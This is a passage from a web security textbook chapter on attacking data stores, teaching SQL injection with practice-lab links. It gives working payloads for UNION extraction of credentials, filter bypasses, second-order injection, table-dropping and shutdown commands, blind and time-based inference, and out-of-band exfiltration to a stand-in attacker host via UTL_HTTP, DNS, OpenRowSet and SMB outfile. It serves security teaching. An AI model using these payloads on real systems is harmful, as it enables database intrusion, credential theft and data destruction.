data from the database.
HACK STEPS
Your fi rst task is to discover the number of columns returned by the original 
query being executed by the application. You can do this in two ways:
 1. You can exploit the fact that NULL can be converted to any data type to 
systematically inject queries with different numbers of columns until your 
injected query is executed. For example:
c09.indd 306 c09.indd 306 8/19/2011 12:09:31 PM 8/19/2011 12:09:31 PM
Stuttard c09.indd V3 - 07/28/2011 Page 307
 Chapter 9 n Attacking Data Stores 307
‚Äò UNION SELECT NULL--
‚Äò UNION SELECT NULL, NULL--
‚Äò UNION SELECT NULL, NULL, NULL--
When your query is executed, you have determined the number of columns required. If the application doesn‚Äôt return database error messages, 
you can still tell when your injected query was successful. An additional 
row of data will be returned, containing either the word NULL or an empty 
string. Note that the injected row may contain only empty table cells and so 
may be hard to see when rendered as HTML. For this reason it is preferable 
to look at the raw response when performing this attack.
 2. Having identified the required number of columns, your next task is to 
discover a column that has a string data type so that you can use this to 
extract arbitrary data from the database. You can do this by injecting a 
query containing NULLs, as you did previously, and systematically replacing each NULL with a. For example, if you know that the query must return 
three columns, you can inject the following:
‚Äò UNION SELECT ‚Äòa‚Äô, NULL, NULL--
‚Äò UNION SELECT NULL, ‚Äòa‚Äô, NULL--
‚Äò UNION SELECT NULL, NULL, ‚Äòa‚Äô--
When your query is executed, you see an additional row of data containing the 
value a. You can then use the relevant column to extract data from the database.
NOTE In Oracle databases, every SELECT statement must include a FROM
attribute, so injecting UNION SELECT NULL produces an error regardless of 
the number of columns. You can satisfy this requirement by selecting from the 
globally accessible table DUAL. For example:
‚Äò UNION SELECT NULL FROM DUAL--
When you have identifi ed the number of columns required in your injected 
query, and have found a column that has a string data type, you are in a position 
to extract arbitrary data. A simple proof-of-concept test is to extract the version 
string of the database, which can be done on any DBMS. For example, if there 
are three columns, and the fi rst column can take string data, you can extract 
the database version by injecting the following query on MS-SQL and MySQL:
‚Äò UNION SELECT @@version,NULL,NULL--
Injecting the following query achieves the same result on Oracle:
‚Äò UNION SELECT banner,NULL,NULL FROM v$version--
In the example of the vulnerable book search application, we can use this 
string as a search term to retrieve the version of the Oracle database:
c09.indd 307 c09.indd 307 8/19/2011 12:09:31 PM 8/19/2011 12:09:31 PM
Stuttard c09.indd V3 - 07/28/2011 Page 308
308 Chapter 9 n Attacking Data Stores
AUTHOR TITLE YEAR
CORE 9.2.0.1.0 Production
NLSRTL Version 9.2.0.1.0 - Production
Oracle9i Enterprise Edition Release 9.2.0.1.0 - Production
PL/SQL Release 9.2.0.1.0 - Production
TNS for 32-bit Windows: Version 9.2.0.1.0 - Production
Of course, even though the database‚Äôs version string may be interesting, and 
may enable you to research vulnerabilities with the specifi c software being used, 
in most cases you will be more interested in extracting actual data from the 
database. To do this, you typically need to address the second proviso described 
earlier. That is, you need to know the name of the database table you want to 
target and the names of its relevant columns.
Extracting Useful Data
To extract useful data from the database, normally you need to know the names 
of the tables and columns containing the data you want to access. The main 
enterprise DBMSs contain a rich amount of database metadata that you can 
query to discover the names of every table and column within the database. 
The methodology for extracting useful data is the same in each case; however, 
the details differ on different database platforms.
Extracting Data with UNION
Let‚Äôs look at an attack being performed against an MS-SQL database, but use a 
methodology that will work on all database technologies. Consider an address 
book application that allows users to maintain a list of contacts and query and 
update their details. When a user searches her address book for a contact named 
Matthew, her browser posts the following parameter:
Name=Matthew
and the application returns the following results:
NAME E-MAIL
Matthew Adamson handytrick@gmail.com
c09.indd 308 c09.indd 308 8/19/2011 12:09:31 PM 8/19/2011 12:09:31 PM
Stuttard c09.indd V3 - 07/28/2011 Page 309
 Chapter 9 n Attacking Data Stores 309
TRY IT!
http://mdsec.net/addressbook/32/
First, we need to determine the required number of columns. Testing for a 
single column results in an error message:
Name=Matthew‚Äô%20union%20select%20null--
All queries combined using a UNION, INTERSECT or EXCEPT operator must 
have an equal number of expressions in their target lists.
We add a second NULL, and the same error occurs. So we continue adding NULLs
until our query is executed, generating an additional item in the results table:
Name=Matthew‚Äô%20union%20select%20null,null,null,null,null--
NAME E-MAIL
Matthew Adamson handytrick@gmail.com
[empty] [empty]
We now verify that the fi rst column in the query contains string data:
Name=Matthew‚Äô%20union%20select%20‚Äôa‚Äô,null,null,null,null--
NAME E-MAIL
Matthew Adamson handytrick@gmail.com
a
The next step is to fi nd out the names of the database tables and columns that 
may contain interesting information. We can do this by querying the metadata 
table information_schema.columns, which contains details of all tables and 
column names within the database. These can be retrieved with this query:
Name=Matthew‚Äô%20union%20select%20table_name,column_name,null,null,
null%20from%20information_schema.columns--
c09.indd 309 c09.indd 309 8/19/2011 12:09:31 PM 8/19/2011 12:09:31 PM
Stuttard c09.indd V3 - 07/28/2011 Page 310
310 Chapter 9 n Attacking Data Stores
NAME E-MAIL
Matthew Adamson handytrick@gmail.com
shop_items price
shop_items prodid
shop_items prodname
addr_book contactemail
addr_book contactname
users username
users password
Here, the users table is an obvious place to begin extracting data. We could 
extract data from the users table using this query:
Name=Matthew‚Äô%20UNION%20select%20username,password,null,null,null%20
from%20users--
NAME E-MAIL
Matthew Adamson handytrick@gmail.com
administrator fme69
dev uber
marcus 8pinto
smith twosixty
jlo 6kdown
TIP The information_schema is supported by MS-SQL, MySQL, and many 
other databases, including SQLite and Postgresql. It is designed to hold database metadata, making it a primary target for attackers wanting to examine 
the database. Note that Oracle doesn‚Äôt support this schema. When targeting 
an Oracle database, the attack would be identical in every other way. However, 
you would use the query SELECT table_name,column_name FROM all_tab_
columns to retrieve information about tables and columns in the database. 
(You would use the user_tab_columns table to focus on the current database 
only.) When analyzing large databases for points of attack, it is usually best to 
look directly for interesting column names rather than tables. For instance:
SELECT table_name,column_name FROM information_schema.columns where
 column_name LIKE ‚Äò%PASS%‚Äô
c09.indd 310 c09.indd 310 8/19/2011 12:09:31 PM 8/19/2011 12:09:31 PM
Stuttard c09.indd V3 - 07/28/2011 Page 311
 Chapter 9 n Attacking Data Stores 311
TIP When multiple columns are returned from a target table, these can be 
concatenated into a single column. This makes retrieval more straightforward, 
because it requires identifi cation of only a single varchar fi eld in the original 
query:
n Oracle: SELECT table_name||‚Äô:‚Äô||column_name FROM 
all_tab_columns
n MS-SQL: SELECT table_name+‚Äô:‚Äô+column_name from information_
schema.columns
n MySQL: SELECT CONCAT(table_name,‚Äô:‚Äô,column_name) from 
information_schema.columns
Bypassing Filters
In some situations, an application that is vulnerable to SQL injection may implement various input fi lters that prevent you from exploiting the fl aw without 
restrictions. For example, the application may remove or sanitize certain characters 
or may block common SQL keywords. Filters of this kind are often vulnerable 
to bypasses, so you should try numerous tricks in this situation.
Avoiding Blocked Characters
If the application removes or encodes some characters that are often used in 
SQL injection attacks, you may still be able to perform an attack without these:
n The single quotation mark is not required if you are injecting into a numeric 
data fi eld or column name. If you need to introduce a string into your 
attack payload, you can do this without needing quotes. You can use 
various string functions to dynamically construct a string using the ASCII 
codes for individual characters. For example, the following two queries 
for Oracle and MS-SQL, respectively, are the equivalent of select ename, 
sal from emp where ename=‚Äômarcus‚Äô:
SELECT ename, sal FROM emp where ename=CHR(109)||CHR(97)||
CHR(114)||CHR(99)||CHR(117)||CHR(115)
SELECT ename, sal FROM emp WHERE ename=CHAR(109)+CHAR(97)
+CHAR(114)+CHAR(99)+CHAR(117)+CHAR(115)
n If the comment symbol is blocked, you can often craft your injected data 
such that it does not break the syntax of the surrounding query, even 
without using this. For example, instead of injecting:
‚Äò or 1=1--
you can inject:
‚Äò or ‚Äòa‚Äô=‚Äôa
c09.indd 311 c09.indd 311 8/19/2011 12:09:31 PM 8/19/2011 12:09:31 PM
Stuttard c09.indd V3 - 07/28/2011 Page 312
312 Chapter 9 n Attacking Data Stores
n When attempting to inject batched queries into an MS-SQL database, 
you do not need to use the semicolon separator. Provided that you fi x 
the syntax of all queries in the batch, the query parser will interpret them 
correctly, whether or not you include a semicolon.
TRY IT!
http://mdsec.net/addressbook/71/
http://mdsec.net/addressbook/76/
Circumventing Simple Validation
Some input validation routines employ a simple blacklist and either block or 
remove any supplied data that appears on this list. In this instance, you should 
try the standard attacks, looking for common defects in validation and canonicalization mechanisms, as described in Chapter 2. For example, if the SELECT
keyword is being blocked or removed, you can try the following bypasses:
SeLeCt
%00SELECT
SELSELECTECT
%53%45%4c%45%43%54
%2553%2545%254c%2545%2543%2554
TRY IT!
http://mdsec.net/addressbook/58/
http://mdsec.net/addressbook/62/
Using SQL Comments
You can insert inline comments into SQL statements in the same way as for C++, 
by embedding them between the symbols /* and */. If the application blocks 
or strips spaces from your input, you can use comments to simulate whitespace 
within your injected data. For example:
SELECT/*foo*/username,password/*foo*/FROM/*foo*/users
In MySQL, comments can even be inserted within keywords themselves, 
which provides another means of bypassing some input validation fi lters while 
preserving the syntax of the actual query. For example:
SEL/*foo*/ECT username,password FR/*foo*/OM users
c09.indd 312 c09.indd 312 8/19/2011 12:09:31 PM 8/19/2011 12:09:31 PM
Stuttard c09.indd V3 - 07/28/2011 Page 313
 Chapter 9 n Attacking Data Stores 313
Exploiting Defective Filters
Input validation routines often contain logic fl aws that you can exploit to smuggle 
blocked input past the fi lter. These attacks often exploit the ordering of multiple 
validation steps, or the failure to apply sanitization logic recursively. Some 
attacks of this kind are described in Chapter 11.
TRY IT!
http://mdsec.net/addressbook/67/
Second-Order SQL Injection
A particularly interesting type of fi lter bypass arises in connection with secondorder SQL injection. Many applications handle data safely when it is fi rst inserted 
into the database. Once data is stored in the database, it may later be processed 
in unsafe ways, either by the application itself or by other back-end processes. 
Many of these are not of the same quality as the primary Internet-facing application but have high-privileged database accounts.
In some applications, input from the user is validated on arrival by escaping 
a single quote. In the original book search example, this approach appears to 
be effective. When the user enters the search term O‚ÄôReilly, the application 
makes the following query:
SELECT author,title,year FROM books WHERE publisher = ‚ÄòO‚Äô‚ÄôReilly‚Äô
Here, the single quotation mark supplied by the user has been converted into 
two single quotation marks. Therefore, the item passed to the database has the 
same literal signifi cance as the original expression the user entered.
One problem with the doubling-up approach arises in more complex situations where the same item of data passes through several SQL queries, being 
written to the database and then read back more than once. This is one example 
of the shortcomings of simple input validation as opposed to boundary validation,
as described in Chapter 2.
Recall the application that allowed users to self-register and contained a SQL 
injection fl aw in an INSERT statement. Suppose that developers attempt to fi x 
the vulnerability by doubling up any single quotation marks that appear within 
user data. Attempting to register the username foo‚Äô results in the following 
query, which causes no problems for the database:
INSERT INTO users (username, password, ID, privs) VALUES (‚Äòfoo‚Äô‚Äô‚Äô,
 ‚Äòsecret‚Äô, 2248, 1)
c09.indd 313 c09.indd 313 8/19/2011 12:09:31 PM 8/19/2011 12:09:31 PM
Stuttard c09.indd V3 - 07/28/2011 Page 314
314 Chapter 9 n Attacking Data Stores
So far, so good. However, suppose that the application also implements a 
password change function. This function is reachable only by authenticated 
users, but for extra protection, the application requires users to submit their 
old password. It then verifi es that this is correct by retrieving the user‚Äôs current password from the database and comparing the two strings. To do this, it 
fi rst retrieves the user‚Äôs username from the database and then constructs the 
following query:
SELECT password FROM users WHERE username = ‚Äòfoo‚Äô‚Äô
Because the username stored in the database is the literal string foo‚Äô, this 
is the value that the database returns when this value is queried. The doubledup escape sequence is used only at the point where strings are passed into the 
database. Therefore, when the application reuses this string and embeds it into 
a second query, a SQL injection fl aw arises, and the user‚Äôs original bad input is 
embedded directly into the query. When the user attempts to change the password, the application returns the following message, which reveals the fl aw:
Unclosed quotation mark before the character string ‚Äòfoo
To exploit this vulnerability, an attacker can simply register a username 
containing his crafted input, and then attempt to change his password. For 
example, if the following username is registered:
‚Äò or 1 in (select password from users where username=‚Äôadmin‚Äô)--
the registration step itself will be handled securely. When the attacker tries to 
change his password, his injected query will be executed, resulting in the following message, which discloses the admin user‚Äôs password:
Microsoft OLE DB Provider for ODBC Drivers error ‚Äò80040e07‚Äô
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting 
the varchar value ‚Äòfme69‚Äô to a column of data type int.
The attacker has successfully bypassed the input validation that was designed 
to block SQL injection attacks. Now he has a way to execute arbitrary queries 
within the database and retrieve the results.
TRY IT!
http://mdsec.net/addressbook/107/
Advanced Exploitation
All the attacks described so far have had a ready means of retrieving any useful data that was extracted from the database, such as by performing a UNION
attack or returning data in an error message. As awareness of SQL injection 
c09.indd 314 c09.indd 314 8/19/2011 12:09:31 PM 8/19/2011 12:09:31 PM
Stuttard c09.indd V3 - 07/28/2011 Page 315
 Chapter 9 n Attacking Data Stores 315
threats has evolved, this kind of situation has become gradually less common. 
It is increasingly the case that the SQL injection fl aws that you encounter will 
be in situations where retrieving the results of your injected queries is not 
straightforward. We will look at several ways in which this problem can arise, 
and how you can deal with it.
NOTE Application owners should be aware that not every attacker is interested in stealing sensitive data. Some may be more destructive. For example, 
by supplying just 12 characters of input, an attacker could turn off an MS-SQL 
database with the shutdown command:
‚Äò shutdown--
An attacker could also inject malicious commands to drop individual tables 
with commands such as these:
‚Äò drop table users--
‚Äò drop table accounts--
‚Äò drop table customers--
Retrieving Data as Numbers
It is fairly common to fi nd that no string fi elds within an application are vulnerable to SQL injection, because input containing single quotation marks is being 
handled properly. However, vulnerabilities may still exist within numeric data 
fi elds, where user input is not encapsulated within single quotes. Often in these 
situations, the only means of retrieving the results of your injected queries is 
via a numeric response from the application.
In this situation, your challenge is to process the results of your injected 
queries in such a way that meaningful data can be retrieved in numeric form. 
Two key functions can be used here:
n ASCII, which returns the ASCII code for the input character
n SUBSTRING (or SUBSTR in Oracle), which returns a substring of its input
These functions can be used together to extract a single character from a 
string in numeric form. For example:
SUBSTRING(‚ÄòAdmin‚Äô,1,1) returns A.
ASCII(‚ÄòA‚Äô) returns 65.
Therefore:
ASCII(SUBSTR(‚ÄòAdmin‚Äô,1,1)) returns 65.
Using these two functions, you can systematically cut a string of useful data 
into its individual characters and return each of these separately, in numeric 
form. In a scripted attack, this technique can be used to quickly retrieve and 
reconstruct a large amount of string-based data one byte at a time.
c09.indd 315 c09.indd 315 8/19/2011 12:09:31 PM 8/19/2011 12:09:31 PM
Stuttard c09.indd V3 - 07/28/2011 Page 316
316 Chapter 9 n Attacking Data Stores
TIP There are numerous subtle variations in how different database platforms handle string manipulation and numeric computation, which you may 
need to take into account when performing advanced attacks of this kind. An 
excellent guide to these differences covering many different databases can be 
found at http://sqlzoo.net/howto/source/z.dir/i08fun.xml.
In a variation on this situation, the authors have encountered cases in which 
what is returned by the application is not an actual number, but a resource for 
which that number is an identifi er. The application performs a SQL query based 
on user input, obtains a numeric identifi er for a document, and then returns the 
document‚Äôs contents to the user. In this situation, an attacker can fi rst obtain 
a copy of every document whose identifi ers are within the relevant numeric 
range and construct a mapping of document contents to identifi ers. Then, when 
performing the attack described previously, the attacker can consult this map to 
determine the identifi er for each document received from the application and 
thereby retrieve the ASCII value of the character he has successfully extracted.
Using an Out-of-Band Channel
In many cases of SQL injection, the application does not return the results of 
any injected query to the user‚Äôs browser, nor does it return any error messages 
generated by the database. In this situation, it may appear that your position is 
futile. Even if a SQL injection fl aw exists, it surely cannot be exploited to extract 
arbitrary data or perform any other action. This appearance is false, however. 
You can try various techniques to retrieve data and verify that other malicious 
actions have been successful.
There are many circumstances in which you may be able to inject an arbitrary 
query but not retrieve its results. Recall the example of the vulnerable login 
form, where the username and password fi elds are vulnerable to SQL injection:
SELECT * FROM users WHERE username = ‚Äòmarcus‚Äô and password = ‚Äòsecret‚Äô
In addition to modifying the query‚Äôs logic to bypass the login, you can inject 
an entirely separate subquery using string concatenation to join its results to 
the item you control. For example:
foo‚Äô || (SELECT 1 FROM dual WHERE (SELECT username FROM all_users WHERE
 username = ‚ÄòDBSNMP‚Äô) = ‚ÄòDBSNMP‚Äô)--
This causes the application to perform the following query:
SELECT * FROM users WHERE username = ‚Äòfoo‚Äô || (SELECT 1 FROM dual WHERE
 (SELECT username FROM all_users WHERE username = ‚ÄòDBSNMP‚Äô) = ‚ÄòDBSNMP‚Äô)
c09.indd 316 c09.indd 316 8/19/2011 12:09:31 PM 8/19/2011 12:09:31 PM
Stuttard c09.indd V3 - 07/28/2011 Page 317
 Chapter 9 n Attacking Data Stores 317
The database executes your arbitrary subquery, appends its results to foo,
and then looks up the details of the resulting username. Of course, the login 
will fail, but your injected query will have been executed. All you will receive 
back in the application‚Äôs response is the standard login failure message. What 
you then need is a way to retrieve the results of your injected query.
A different situation arises when you can employ batch queries against MS-SQL 
databases. Batch queries are extremely useful, because they allow you to execute 
an entirely separate statement over which you have full control, using a different 
SQL verb and targeting a different table. However, because of how batch queries 
are carried out, the results of an injected query cannot be retrieved directly. 
Again, you need a means of retrieving the lost results of your injected query.
One method for retrieving data that is often effective in this situation is to 
use an out-of-band channel. Having achieved the ability to execute arbitrary 
SQL statements within the database, it is often possible to leverage some of the 
database‚Äôs built-in functionality to create a network connection back to your own 
computer, over which you can transmit arbitrary data that you have gathered 
from the database.
The means of creating a suitable network connection are highly databasedependent. Different methods may or may not be available given the privilege 
level of the database user with which the application is accessing the database. 
Some of the most common and effective techniques for each type of database 
are described here.
MS-SQL
On older databases such as MS-SQL 2000 and earlier, the OpenRowSet command 
can be used to open a connection to an external database and insert arbitrary 
data into it. For example, the following query causes the target database to open 
a connection to the attacker‚Äôs database and insert the version string of the target 
database into the table called foo:
insert into openrowset(‚ÄòSQLOLEDB‚Äô,
‚ÄòDRIVER={SQL Server};SERVER=mdattacker.net,80;UID=sa;PWD=letmein‚Äô,
‚Äòselect * from foo‚Äô) values (@@version)
Note that you can specify port 80, or any other likely value, to increase your 
chance of making an outbound connection through any fi rewalls.
Oracle
Oracle contains a large amount of default functionality that is accessible by 
low-privileged users and that can be used to create an out-of-band connection.
The UTL_HTTP package can be used to make arbitrary HTTP requests to other 
hosts. UTL_HTTP contains rich functionality and supports proxy servers, cookies, 
redirects, and authentication. This means that an attacker who has compromised 
c09.indd 317 c09.indd 317 8/19/2011 12:09:31 PM 8/19/2011 12:09:31 PM
Stuttard c09.indd V3 - 07/28/2011 Page 318
318 Chapter 9 n Attacking Data Stores
a database on a highly restricted internal corporate network may be able to 
leverage a corporate proxy to initiate outbound connections to the Internet.
In the following example, UTL_HTTP is used to transmit the results of an 
injected query to a server controlled by the attacker:
/employees.asp?EmpNo=7521‚Äô||UTL_HTTP.request(‚Äòmdattacker.net:80/‚Äô||
(SELECT%20username%20FROM%20all_users%20WHERE%20ROWNUM%3d1))--
This URL causes UTL_HTTP to make a GET request for a URL containing the 
fi rst username in the table all_users. The attacker can simply set up a netcat 
listener on mdattacker.net to receive the result:
C:\>nc -nLp 80
GET /SYS HTTP/1.1
Host: mdattacker.net
Connection: close
The UTL_INADDR package is designed to be used to resolve hostnames to IP 
addresses. It can be used to generate arbitrary DNS queries to a server controlled by the attacker. In many situations, this is more likely to succeed than 
the UTL_HTTP attack, because DNS traffi c is often allowed out through corporate 
fi rewalls even when HTTP traffi c is restricted. The attacker can leverage this 
package to perform a lookup on a hostname of his choice, effectively retrieving 
arbitrary data by prepending it as a subdomain to a domain name he controls. 
For example:
/employees.asp?EmpNo=7521‚Äô||UTL_INADDR.GET_HOST_NAME((SELECT%20PASSWORD%
20FROM%20DBA_USERS%20WHERE%20NAME=‚ÄôSYS‚Äô)||‚Äô.mdattacker.net‚Äô)
This results in a DNS query to the mdattacker.net name server containing 
the SYS user‚Äôs password hash:
DCB748A5BC5390F2.mdattacker.net
The UTL_SMTP package can be used to send e-mails. This facility can be used 
to retrieve large volumes of data captured from the database by sending this 
in outbound e-mails.
The UTL_TCP package can be used to open arbitrary TCP sockets to send and 
receive network data.
NOTE On Oracle 11g, an additional ACL protects many of the resources just 
described from execution by any arbitrary database user. An easy way around 
this is to dip into the new functionality provided in Oracle 11g and use this code:
SYS.DBMS_LDAP.INIT((SELECT PASSWORD FROM SYS.USER$ WHERE
 NAME=‚ÄôSYS‚Äô)||‚Äô.mdsec.net‚Äô,80)
c09.indd 318 c09.indd 318 8/19/2011 12:09:31 PM 8/19/2011 12:09:31 PM
Stuttard c09.indd V3 - 07/28/2011 Page 319
 Chapter 9 n Attacking Data Stores 319
MySQL
The SELECT ... INTO OUTFILE command can be used to direct the output from 
an arbitrary query into a fi le. The specifi ed fi lename may contain a UNC path, 
enabling you to direct the output to a fi le on your own computer. For example:
select * into outfile ‚Äò\\\\mdattacker.net\\share\\output.txt‚Äô from users;
To receive the fi le, you need to create an SMB share on your computer that 
allows anonymous write access. You can confi gure shares on both Windows 
and UNIX-based platforms to behave in this way. If you have diffi culty receiving the exported fi le, this may result from a confi guration issue in your SMB 
server. You can use a sniffer to confi rm whether the target server is initiating 
any inbound connections to your computer. If it is, consult your server documentation to ensure that it is confi gured correctly.
Leveraging the Operating System
It is often possible to perform escalation attacks via the database that result in 
execution of arbitrary commands on the operating system of the database server 
itself. In this situation, many more avenues are available to you for retrieving 
data, such as using built-in commands like tftp, mail, and telnet, or copying 
data into the web root for retrieval using a browser. See the later section ‚ÄúBeyond 
SQL Injection‚Äù for techniques for escalating privileges on the database itself.
Using Inference: Conditional Responses
There are many reasons why an out-of-band channel may be unavailable. Most 
commonly this occurs because the database is located within a protected network whose perimeter fi rewalls do not allow any outbound connections to the 
Internet or any other network. In this situation, you are restricted to accessing 
the database entirely via your injection point into the web application.
 In this situation, working more or less blind, you can use many techniques 
to retrieve arbitrary data from within the database. These techniques are all 
based on the concept of using an injected query to conditionally trigger some 
detectable behavior by the database and then inferring a required item of information on the basis of whether this behavior occurs.
Recall the vulnerable login function where the username and password fi elds 
can be injected into to perform arbitrary queries:
SELECT * FROM users WHERE username = ‚Äòmarcus‚Äô and password = ‚Äòsecret‚Äô
Suppose that you have not identifi ed any method of transmitting the results 
of your injected queries back to the browser. Nevertheless, you have already 
seen how you can use SQL injection to modify the application‚Äôs behavior. 
c09.indd 319 c09.indd 319 8/19/2011 12:09:32 PM 8/19/2011 12:09:32 PM
Stuttard c09.indd V3 - 07/28/2011 Page 320
320 Chapter 9 n Attacking Data Stores
For example, submitting the following two pieces of input causes very different results:
admin‚Äô AND 1=1--
admin‚Äô AND 1=2--
In the fi rst case, the application logs you in as the admin user. In the second 
case, the login attempt fails, because the 1=2 condition is always false. You 
can leverage this control of the application‚Äôs behavior as a means of inferring 
the truth or falsehood of arbitrary conditions within the database itself. For 
example, using the ASCII and SUBSTRING functions described previously, you 
can test whether a specifi c character of a captured string has a specifi c value. For 
example, submitting this piece of input logs you in as the admin user, because 
the condition tested is true:
admin‚Äô AND ASCII(SUBSTRING(‚ÄòAdmin‚Äô,1,1)) = 65--
Submitting the following input, however, results in a failed login, because 
the condition tested is false:
admin‚Äô AND ASCII(SUBSTRING(‚ÄòAdmin‚Äô,1,1)) = 66--
By submitting a large number of such queries, cycling through the range 
of likely ASCII codes for each character until a hit occurs, you can extract the 
entire string, one byte at a time.
Inducing Conditional Errors
In the preceding example, the application contained some prominent functionality whose logic could be directly controlled by injecting into an existing SQL 
query. The application‚Äôs designed behavior (a successful versus a failed login) 
could be hijacked to return a single item of information to the attacker. However, 
not all situations are this straightforward. In some cases, you may be injecting 
into a query that has no noticeable effect on the application‚Äôs behavior, such 
as a logging mechanism. In other cases, you may be injecting a subquery or a 
batched query whose results are not processed by the application in any way. 
In this situation, you may struggle to fi nd a way to cause a detectable difference 
in behavior that is contingent on a specifi ed condition.
David Litchfi eld devised a technique that can be used to trigger a detectable difference in behavior in most circumstances. The core idea is to inject 
a query that induces a database error contingent on some specifi ed condition. When a database error occurs, it is often externally detectable, either 
through an HTTP 500 response code or through some kind of error message 
or anomalous behavior (even if the error message itself does not disclose any 
useful information).
c09.indd 320 c09.indd 320 8/19/2011 12:09:32 PM 8/19/2011 12:09:32 PM
Stuttard c09.indd V3 - 07/28/2011 Page 321
 Chapter 9 n Attacking Data Stores 321
The technique relies on a feature of database behavior when evaluating conditional statements: the database evaluates only those parts of the statement 
that need to be evaluated given the status of other parts. An example of this 
behavior is a SELECT statement containing a WHERE clause:
SELECT X FROM Y WHERE C
This causes the database to work through each row of table Y, evaluating 
condition C, and returning X in those cases where condition C is true. If condition C is never true, the expression X is never evaluated.
This behavior can be exploited by fi nding an expression X that is syntactically 
valid but that generates an error if it is ever evaluated. An example of such an 
expression in Oracle and MS-SQL is a divide-by-zero computation, such as 1/0.
If condition C is ever true, expression X is evaluated, causing a database error. 
If condition C is always false, no error is generated. You can, therefore, use the 
presence or absence of an error to test an arbitrary condition C.
An example of this is the following query, which tests whether the default 
Oracle user DBSNMP exists. If this user exists, the expression 1/0 is evaluated, 
causing an error:
SELECT 1/0 FROM dual WHERE (SELECT username FROM all_users WHERE username =
 ‚ÄòDBSNMP‚Äô) = ‚ÄòDBSNMP‚Äô
The following query tests whether an invented user AAAAAA exists. Because 
the WHERE condition is never true, the expression 1/0 is not evaluated, so no 
error occurs:
SELECT 1/0 FROM dual WHERE (SELECT username FROM all_users WHERE username =
 ‚ÄòAAAAAA‚Äô) = ‚ÄòAAAAAA‚Äô
What this technique achieves is a way of inducing a conditional response 
within the application, even in cases where the query you are injecting has no 
impact on the application‚Äôs logic or data processing. It therefore enables you 
to use the inference techniques described previously to extract data in a wide 
range of situations. Furthermore, because of the technique‚Äôs simplicity, the same 
attack strings will work on a range of databases, and where the injection point 
is into various types of SQL statements.
This technique is also versatile because it can be used in all kinds of injection 
points where a subquery can be injected. For example:
(select 1 where <<condition>> or 1/0=0)
Consider an application that provides a searchable and sortable contacts 
database. The user controls the parameters department and sort:
/search.jsp?department=30&sort=ename
c09.indd 321 c09.indd 321 8/19/2011 12:09:32 PM 8/19/2011 12:09:32 PM
Stuttard c09.indd V3 - 07/28/2011 Page 322
322 Chapter 9 n Attacking Data Stores
This appears in the following back-end query, which parameterizes the department parameter but concatenates the sort parameter onto the query:
String queryText = ‚ÄúSELECT ename,job,deptno,hiredate FROM emp WHERE deptno = ?
 ORDER BY ‚Äú + request.getParameter(‚Äúsort‚Äù) + ‚Äú DESC‚Äù;
It is not possible to alter the WHERE clause, or issue a UNION query after an ORDER 
BY clause; however, an attacker can create an inference condition by issuing the 
following statement:
/search.jsp?department=20&sort=(select%201/0%20from%20dual%20where%20
(select%20substr(max(object_name),1,1)%20FROM%20user_objects)=‚ÄôY‚Äô)
If the fi rst letter of the fi rst object name in the user_objects table is equal 
to ‚ÄòY‚Äô, this will cause the database to attempt to evaluate 1/0. This will result 
in an error, and no results will be returned by the overall query. If the letter 
is not equal to ‚ÄòY‚Äô, results from the original query will be returned in the 
default order. Carefully supplying this condition to an SQL injection tool 
such as Absinthe or SQLMap, we can retrieve every record in the database.
Using Time Delays
Despite all the sophisticated techniques already described, there may yet be 
situations in which none of these tricks are effective. In some cases, you may 
be able to inject a query that returns no results to the browser, cannot be used 
to open an out-of-band channel, and that has no effect on the application‚Äôs 
behavior, even if it induces an error within the database itself.
In this situation, all is not lost, thanks to a technique invented by Chris Anley 
and Sherief Hammad of NGSSoftware. They devised a way of crafting a query 
that would cause a time delay, contingent on some condition specifi ed by the 
attacker. The attacker can submit his query and then monitor the time taken for 
the server to respond. If a delay occurs, the attacker may infer that the condition is true. Even if the actual content of the application‚Äôs response is identical 
in the two cases, the presence or absence of a time delay enables the attacker to 
extract a single bit of information from the database. By performing numerous 
such queries, the attacker can systematically retrieve arbitrarily complex data 
from the database one bit at a time.
The precise means of inducing a suitable time delay depends on the target 
database being used. MS-SQL contains a built-in WAITFOR command, which can 
be used to cause a specifi ed time delay. For example, the following query causes 
a time delay of 5 seconds if the current database user is sa:
if (select user) = ‚Äòsa‚Äô waitfor delay ‚Äò0:0:5‚Äô
c09.indd 322 c09.indd 322 8/19/2011 12:09:32 PM 8/19/2011 12:09:32 PM
Stuttard c09.indd V3 - 07/28/2011 Page 323
 Chapter 9 n Attacking Data Stores 323
Equipped with this command, the attacker can retrieve arbitrary information in various ways. One method is to leverage the same technique already 
described for the case where the application returns conditional responses. 
Now, instead of triggering a different application response when a particular 
condition is detected, the injected query induces a time delay. For example, the 
second of these queries causes a time delay, indicating that the fi rst letter of the 
captured string is A:
if ASCII(SUBSTRING(‚ÄòAdmin‚Äô,1,1)) = 64 waitfor delay ‚Äò0:0:5‚Äô
if ASCII(SUBSTRING(‚ÄòAdmin‚Äô,1,1)) = 65 waitfor delay ‚Äò0:0:5‚Äô
As before, the attacker can cycle through all possible values for each character 
until a time delay occurs. Alternatively, the attack could be made more effi cient 
by reducing the number of requests needed. An additional technique is to break 
each byte of data into individual bits and retrieve each bit in a single query. The 
POWER command and the bitwise AND operator & can be used to specify conditions on a bit-by-bit basis. For example, the following query tests the fi rst bit of 
the fi rst byte of the captured data and pauses if it is 1:
if (ASCII(SUBSTRING(‚ÄòAdmin‚Äô,1,1)) & (POWER(2,0))) > 0 waitfor delay ‚Äò0:0:5‚Äô
The following query performs the same test on the second bit:
if (ASCII(SUBSTRING(‚ÄòAdmin‚Äô,1,1)) & (POWER(2,1))) > 0 waitfor delay ‚Äò0:0:5‚Äô
As mentioned earlier, the means of inducing a time delay are highly databasedependent. In current versions of MySQL, the sleep function can be used to 
create a time delay for a specifi ed number of milliseconds:
select if(user() like ‚Äòroot@%‚Äô, sleep(5000), ‚Äòfalse‚Äô)
In versions of MySQL prior to 5.0.12, the sleep function cannot be used. An 
alternative is the benchmark function, which can be used to perform a specifi ed 
action repeatedly. Instructing the database to perform a processor-intensive 
action, such as a SHA-1 hash, many times will result in a measurable time 
delay. For example:
select if(user() like ‚Äòroot@%‚Äô, benchmark(50000,sha1(‚Äòtest‚Äô)), ‚Äòfalse‚Äô)
In PostgreSQL, the PG_SLEEP function can be used in the same way as the 
MySQL sleep function.
Oracle has no built-in method to perform a time delay, but you can use 
other tricks to cause a time delay to occur. One trick is to use UTL_HTTP to 
c09.indd 323 c09.indd 323 8/19/2011 12:09:32 PM 8/19/2011 12:09:32 PM
Stuttard c09.indd V3 - 07/28/2011 Page 324
324 Chapter 9 n Attacking Data Stores
